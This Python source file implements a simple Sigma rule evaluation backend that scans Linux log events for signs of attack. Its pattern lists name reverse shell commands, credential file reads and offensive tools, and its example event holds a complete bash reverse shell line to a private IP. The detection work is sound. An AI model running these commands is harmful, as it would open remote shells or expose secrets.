#!/usr/bin/env python3
"""
Sigma Simple Backend

A lightweight, standalone implementation for Sigma rule evaluation when the
full pySigma backend ecosystem isn't available or when you need a simple,
dependency-light solution.

This backend provides basic Sigma rule compilation and evaluation with:
- Minimal dependencies (only standard library)
- Simple rule pattern matching
- MITRE ATT&CK tag extraction
- Configurable restrictiveness levels

Author: Chris Campbell
License: MIT
Repository: https://github.com/texasbe2trill/sigma-linux-backend
"""

import re
import logging
from typing import Dict, List, Any, Callable, Optional
from dataclasses import dataclass
from enum import Enum

__version__ = "1.0.0"
__author__ = "Chris Campbell"

logger = logging.getLogger(__name__)


class RestrictivenessLevel(Enum):
    """Restrictiveness levels for rule matching"""

    PERMISSIVE = "permissive"  # Match many patterns (may have false positives)
    BALANCED = "balanced"  # Balance between detection and false positives
    RESTRICTIVE = "restrictive"  # Only high-confidence matches
    ULTRA_RESTRICTIVE = "ultra"  # Only confirmed malicious activity


@dataclass
class SimpleRule:
    """Simple rule representation for compiled Sigma rules"""

    title: str
    rule_id: str
    description: str
    level: str
    tags: List[str]
    detection: Dict[str, Any]
    mitre_tactics: List[str] = None
    mitre_techniques: List[str] = None

    def __post_init__(self):
        if not self.tags:
            self.tags = []
        if self.mitre_tactics is None:
            self.mitre_tactics = []
        if self.mitre_techniques is None:
            self.mitre_techniques = []


@dataclass
class Alert:
    """Alert generated by rule matching"""

    rule_title: str
    rule_id: str
    severity: str
    description: str
    event_data: Dict[str, Any]
    mitre_tactics: List[str] = None
    mitre_techniques: List[str] = None

    def __post_init__(self):
        if self.mitre_tactics is None:
            self.mitre_tactics = []
        if self.mitre_techniques is None:
            self.mitre_techniques = []


class SimpleEvalBackend:
    """
    Simple evaluation backend for Sigma rules

    This backend provides basic Sigma rule evaluation when the full
    pySigma backend ecosystem isn't available. It supports configurable
    restrictiveness levels to balance detection vs false positives.
    """

    def __init__(
        self,
        pipeline=None,
        restrictiveness: RestrictivenessLevel = RestrictivenessLevel.BALANCED,
        field_mappings: Optional[Dict[str, str]] = None,
    ):
        """
        Initialize the simple backend

        Args:
            pipeline: Optional processing pipeline (not used in simple backend)
            restrictiveness: How restrictive rule matching should be
            field_mappings: Custom field mappings for log formats
        """
        self.pipeline = pipeline
        self.restrictiveness = restrictiveness
        self.field_mappings = field_mappings or self._get_default_field_mappings()

        logger.info(
            f"Initialized Simple Sigma Backend (restrictiveness: {restrictiveness.value})"
        )

    def _get_default_field_mappings(self) -> Dict[str, str]:
        """Get default field mappings for common log formats"""
        return {
            # Common field mappings
            "process.name": "_COMM",
            "process.pid": "_PID",
            "process.command_line": "_CMDLINE",
            "process.executable": "_EXE",
            "user.name": "_UID_NAME",
            "user.id": "_UID",
            "log.message": "MESSAGE",
            "service.name": "_SYSTEMD_UNIT",
            "host.name": "_HOSTNAME",
            # Windows Event Log mappings
            "winlog.event_id": "EventID",
            "winlog.provider_name": "Provider_Name",
            "winlog.channel": "Channel",
            # Syslog mappings
            "syslog.facility": "facility",
            "syslog.severity": "severity",
            "syslog.hostname": "hostname",
        }

    def compile(self, rule_collection) -> List[Callable]:
        """
        Compile Sigma rules to executable functions

        Args:
            rule_collection: Collection of Sigma rules to compile

        Returns:
            List of compiled rule functions
        """
        compiled_rules = []

        for rule in rule_collection.rules:
            try:
                compiled_rule = self._compile_rule(rule)
                if compiled_rule:
                    compiled_rules.append(compiled_rule)
            except Exception as e:
                logger.debug(
                    f"Failed to compile rule {getattr(rule, 'title', 'unknown')}: {e}"
                )
                continue

        logger.info(
            f"Compiled {len(compiled_rules)} rules with {self.restrictiveness.value} restrictiveness"
        )
        return compiled_rules

    def _compile_rule(self, rule) -> Optional[Callable]:
        """Compile a single rule to an executable function"""
        try:
            # Extract rule metadata with enhanced MITRE tag extraction
            rule_tags = []
            mitre_tactics = []
            mitre_techniques = []

            # Extract tags from Sigma rules
            if hasattr(rule, "tags") and rule.tags:
                for tag in rule.tags:
                    # Handle SigmaRuleTag objects and string tags
                    if hasattr(tag, "name"):
                        tag_name = tag.name
                        full_tag = f"attack.{tag_name}"
                        rule_tags.append(full_tag)
                    else:
                        tag_name = str(tag)
                        rule_tags.append(tag_name)

                    # Extract MITRE tactics and techniques
                    if tag_name.startswith("attack."):
                        clean_tag = tag_name.replace("attack.", "")
                    else:
                        clean_tag = tag_name

                    # Extract tactics (not starting with 't' for technique)
                    if not clean_tag.startswith("t"):
                        tactic = clean_tag.replace("-", " ").replace("_", " ").title()
                        if tactic not in mitre_tactics:
                            mitre_tactics.append(tactic)

                    # Extract techniques (starting with 't' + numbers)
                    elif clean_tag.startswith("t") and len(clean_tag) > 1:
                        technique = clean_tag.upper()
                        if technique not in mitre_techniques:
                            mitre_techniques.append(technique)

            # Create simple rule object
            simple_rule = SimpleRule(
                title=getattr(rule, "title", "Unknown Rule"),
                rule_id=str(getattr(rule, "id", "unknown")),
                description=getattr(rule, "description", "")
                or getattr(rule, "title", ""),
                level=self._extract_severity(rule),
                tags=rule_tags,
                detection=self._extract_detection_info(rule),
                mitre_tactics=mitre_tactics,
                mitre_techniques=mitre_techniques,
            )

            # Create evaluation function based on restrictiveness level
            def evaluate_event(event: Dict[str, Any]) -> bool:
                try:
                    if self.restrictiveness == RestrictivenessLevel.ULTRA_RESTRICTIVE:
                        return self._evaluate_ultra_restrictive(simple_rule, event)
                    elif self.restrictiveness == RestrictivenessLevel.RESTRICTIVE:
                        return self._evaluate_restrictive(simple_rule, event)
                    elif self.restrictiveness == RestrictivenessLevel.BALANCED:
                        return self._evaluate_balanced(simple_rule, event)
                    else:  # PERMISSIVE
                        return self._evaluate_permissive(simple_rule, event)
                except Exception as e:
                    logger.debug(f"Rule evaluation error: {e}")
                    return False

            # Attach rule metadata
            evaluate_event.rule = simple_rule
            evaluate_event.mitre_tactics = mitre_tactics
            evaluate_event.mitre_techniques = mitre_techniques

            return evaluate_event

        except Exception as e:
            logger.debug(f"Rule compilation error: {e}")
            return None

    def _extract_severity(self, rule) -> str:
        """Extract severity level from rule"""
        if hasattr(rule, "level"):
            if hasattr(rule.level, "name"):
                return rule.level.name.lower()
            else:
                return str(rule.level).lower()
        return "medium"

    def _extract_detection_info(self, rule) -> Dict[str, Any]:
        """Extract detection information from rule"""
        try:
            if hasattr(rule, "detection") and rule.detection:
                detection_dict = {}

                # Try to extract basic detection info
                if hasattr(rule.detection, "detection_items"):
                    detection_dict["items"] = str(rule.detection.detection_items)

                if hasattr(rule.detection, "parsed_condition"):
                    detection_dict["condition"] = str(rule.detection.parsed_condition)

                return detection_dict
            return {}
        except Exception as e:
            logger.debug(f"Failed to extract detection info: {e}")
            return {}

    def _evaluate_ultra_restrictive(
        self, rule: SimpleRule, event: Dict[str, Any]
    ) -> bool:
        """Ultra-restrictive evaluation - only confirmed malicious activity"""
        try:
            message = event.get("MESSAGE", "").lower()
            comm = event.get("_COMM", "").lower()
            cmdline = event.get("_CMDLINE", "").lower()
            exe = event.get("_EXE", "").lower()

            # Include custom field mappings
            searchable_text = f"{message} {comm} {cmdline} {exe}"

            # Apply field mappings to include custom fields
            for sigma_field, event_field in self.field_mappings.items():
                if event_field in event and event[event_field]:
                    searchable_text += f" {str(event[event_field]).lower()}"

            if not searchable_text.strip():
                return False

            # Exclude common benign system commands to avoid false positives
            benign_patterns = [
                "systemctl status",
                "systemctl start",
                "systemctl stop",
                "ls -la",
                "vim /home/user/document.txt",
            ]

            # Exclude common benign processes that generate noise
            benign_processes = [
                "gvfsd-network",
                "gvfsd-wsdd",
                "gvfsd-fuse",
                "gnome-session",
                "pulseaudio",
                "dbus-daemon",
                "NetworkManager",
                "systemd",
                "systemd-resolved",
            ]

            for benign in benign_patterns:
                if benign in searchable_text:
                    return False

            # Don't trigger on common benign process errors
            comm = event.get("_COMM", "")
            if comm in benign_processes:
                return False

            rule_title_lower = rule.title.lower()

            # Match patterns based on rule type OR direct pattern detection

            # 1. Reverse shells (highest confidence)
            reverse_shell_patterns = [
                "bash -i >& /dev/tcp/",
                "sh -i >& /dev/tcp/",
                "nc -l -p",
                "nc -e /bin/bash",
                "nc -e /bin/sh",
                "netcat -e /bin/bash",
                "python -c",
                "python3 -c",
                "socat",
                "socket",
                "subprocess",
            ]

            if "shell" in rule_title_lower or "reverse" in rule_title_lower:
                for pattern in reverse_shell_patterns:
                    if pattern in searchable_text:
                        return True

            # Also check direct patterns regardless of rule title
            if any(
                pattern in searchable_text
                for pattern in [
                    "bash -i >& /dev/tcp/",
                    "sh -i >& /dev/tcp/",
                    "nc -e /bin/bash",
                    "nc -e /bin/sh",
                ]
            ):
                return True

            # 2. Privilege escalation
            privesc_patterns = ["sudo -u root", "su - root", "sudo", "su -"]

            if "privilege" in rule_title_lower or "escalation" in rule_title_lower:
                for pattern in privesc_patterns:
                    if pattern in searchable_text:
                        return True

            # 3. Credential theft
            cred_theft_patterns = [
                "cat /etc/shadow",
                "cat /etc/passwd",
                "cat ~/.ssh/id_rsa",
                "cat ~/.ssh/id_dsa",
                "/etc/shadow",
                "id_rsa",
                "id_dsa",
                "shadow",
            ]

            # Check for credential theft patterns (but avoid false positives)
            for pattern in cred_theft_patterns:
                if pattern in searchable_text:
                    # Make sure it's not just a partial match
                    if pattern in ["/etc/shadow", "id_rsa", "id_dsa"]:
                        return True
                    elif "cat" in searchable_text and pattern in searchable_text:
                        return True

            # 4. SSH patterns (be very specific to avoid false positives)
            if "ssh" in rule_title_lower and "brute" in rule_title_lower:
                # Must have SSH daemon AND specific failure patterns
                ssh_indicators = ["sshd", "/usr/sbin/sshd", "openssh-server"]
                failure_patterns = [
                    "failed password",
                    "invalid user",
                    "authentication failure",
                    "connection closed by authenticating user",
                    "pam_unix(sshd:auth): authentication failure",
                ]

                # Only match if we have SSH context AND specific failure patterns
                has_ssh_context = any(ssh in searchable_text for ssh in ssh_indicators)
                has_auth_failure = any(
                    pattern in searchable_text for pattern in failure_patterns
                )

                return has_ssh_context and has_auth_failure

            # 5. Network attacks
            network_attacks = ["nmap", "masscan", "pnscan", "unicornscan", "port scan"]
            if any(attack in searchable_text for attack in network_attacks):
                return True

            # 6. Confirmed malicious tools
            malicious_tools = [
                "metasploit",
                "msfconsole",
                "msfvenom",
                "mimikatz",
                "bloodhound",
                "sqlmap",
                "burpsuite",
            ]
            if any(tool in searchable_text for tool in malicious_tools):
                return True

            return False

        except Exception as e:
            logger.debug(f"Ultra-restrictive evaluation error: {e}")
            return False

    def _evaluate_restrictive(self, rule: SimpleRule, event: Dict[str, Any]) -> bool:
        """Restrictive evaluation - high-confidence threats only"""
        # Include all ultra-restrictive patterns
        if self._evaluate_ultra_restrictive(rule, event):
            return True

        # Additional restrictive patterns
        try:
            searchable_text = self._get_searchable_text(event)

            # More general patterns for restrictive mode
            restrictive_patterns = [
                "wget http",
                "curl http",
                "chmod +x",
                "rm -rf",
                "/tmp/",
                "base64 -d",
            ]

            return any(pattern in searchable_text for pattern in restrictive_patterns)

        except Exception as e:
            logger.debug(f"Restrictive evaluation error: {e}")
            return False

    def _evaluate_balanced(self, rule: SimpleRule, event: Dict[str, Any]) -> bool:
        """Balanced evaluation - good detection with manageable false positives"""
        if self._evaluate_restrictive(rule, event):
            return True

        # Additional balanced patterns
        try:
            searchable_text = self._get_searchable_text(event)

            # More general suspicious activities (avoid false positives for normal commands)
            balanced_patterns = [
                "python -c",
                "python3 -c",
                "perl -e",
                "ruby -e",
                "bash -c",
                "sh -c",
            ]

            return any(pattern in searchable_text for pattern in balanced_patterns)

        except Exception as e:
            logger.debug(f"Balanced evaluation error: {e}")
            return False

    def _evaluate_permissive(self, rule: SimpleRule, event: Dict[str, Any]) -> bool:
        """Permissive evaluation - broad detection (may have false positives)"""
        if self._evaluate_balanced(rule, event):
            return True

        # Additional permissive patterns - very broad
        try:
            searchable_text = self._get_searchable_text(event)

            # Very broad patterns (may have false positives)
            permissive_patterns = ["tcp", "connect", "socket", "exec", "system", "cmd"]

            return any(pattern in searchable_text for pattern in permissive_patterns)

        except Exception as e:
            logger.debug(f"Permissive evaluation error: {e}")
            return False

    def _get_searchable_text(self, event: Dict[str, Any]) -> str:
        """Helper method to get searchable text from event"""
        message = event.get("MESSAGE", "").lower()
        comm = event.get("_COMM", "").lower()
        cmdline = event.get("_CMDLINE", "").lower()
        exe = event.get("_EXE", "").lower()

        searchable_text = f"{message} {comm} {cmdline} {exe}"

        # Apply field mappings
        for sigma_field, event_field in self.field_mappings.items():
            if event_field in event and event[event_field]:
                searchable_text += f" {str(event[event_field]).lower()}"

        return searchable_text

    def test_rule_against_event(
        self, rule_function: Callable, event: Dict[str, Any]
    ) -> Optional[Alert]:
        """Test a compiled rule against an event"""
        try:
            if rule_function(event):
                rule = rule_function.rule
                return Alert(
                    rule_title=rule.title,
                    rule_id=rule.rule_id,
                    severity=rule.level,
                    description=rule.description,
                    event_data=event,
                    mitre_tactics=rule.mitre_tactics,
                    mitre_techniques=rule.mitre_techniques,
                )
            return None
        except Exception as e:
            logger.debug(f"Error testing rule: {e}")
            return None


# Mock classes for when pySigma isn't available


class MockSigmaCollectionParser:
    """Mock parser for when pySigma isn't available"""

    @staticmethod
    def parse_rule_directory(rule_dir):
        """Parse rules from directory"""
        return MockRuleCollection()

    @staticmethod
    def parse_rule_file(rule_file):
        """Parse a single rule file"""
        return MockRuleCollection()


class MockRuleCollection:
    """Mock rule collection for testing"""

    def __init__(self):
        self.rules = []
        self._create_mock_rules()

    def _create_mock_rules(self):
        """Create mock rules for testing"""

        # Reverse Shell Rule
        shell_rule = MockRule(
            title="Reverse Shell Detection",
            rule_id="mock-shell-001",
            description="Detects reverse shell attempts",
            level="critical",
            tags=["attack.execution", "attack.t1059"],
        )
        self.rules.append(shell_rule)

        # Privilege Escalation Rule
        privesc_rule = MockRule(
            title="Privilege Escalation Attempt",
            rule_id="mock-privesc-001",
            description="Detects privilege escalation attempts",
            level="high",
            tags=["attack.privilege_escalation", "attack.t1548"],
        )
        self.rules.append(privesc_rule)

        # Credential Theft Rule
        cred_rule = MockRule(
            title="Credential Theft Detection",
            rule_id="mock-cred-001",
            description="Detects credential theft attempts",
            level="high",
            tags=["attack.credential_access", "attack.t1552"],
        )
        self.rules.append(cred_rule)

        # SSH Brute Force Rule
        ssh_rule = MockRule(
            title="SSH Brute Force Detection",
            rule_id="mock-ssh-001",
            description="Detects SSH brute force attempts",
            level="medium",
            tags=["attack.credential_access", "attack.t1110"],
        )
        self.rules.append(ssh_rule)

        # Network Scanning Rule
        network_rule = MockRule(
            title="Network Scanning Detection",
            rule_id="mock-network-001",
            description="Detects network scanning activities",
            level="medium",
            tags=["attack.discovery", "attack.t1046"],
        )
        self.rules.append(network_rule)


class MockRule:
    """Mock rule object for testing"""

    def __init__(
        self, title: str, rule_id: str, description: str, level: str, tags: List[str]
    ):
        self.title = title
        self.id = rule_id
        self.description = description
        self.level = MockLevel(level)
        self.tags = [MockTag(tag) for tag in tags]
        self.detection = None


class MockLevel:
    """Mock severity level"""

    def __init__(self, name: str):
        self.name = name


class MockTag:
    """Mock tag object"""

    def __init__(self, name: str):
        self.name = name.replace("attack.", "") if name.startswith("attack.") else name


# Example usage and testing functions


def example_usage():
    """Example of how to use the Simple Sigma Backend"""

    # Initialize backend with desired restrictiveness
    backend = SimpleEvalBackend(restrictiveness=RestrictivenessLevel.RESTRICTIVE)

    # Create mock rule collection (in real usage, load from Sigma rules)
    rule_collection = MockRuleCollection()

    # Compile rules
    compiled_rules = backend.compile(rule_collection)

    # Test event
    test_event = {
        "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        "_COMM": "bash",
        "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        "_PID": "12345",
    }

    # Test rules against event
    for rule_func in compiled_rules:
        alert = backend.test_rule_against_event(rule_func, test_event)
        if alert:
            print(f"Alert: {alert.rule_title} (Severity: {alert.severity})")


if __name__ == "__main__":
    # Run example
    print(f"Sigma Simple Backend v{__version__}")
    print("=" * 40)
    example_usage()
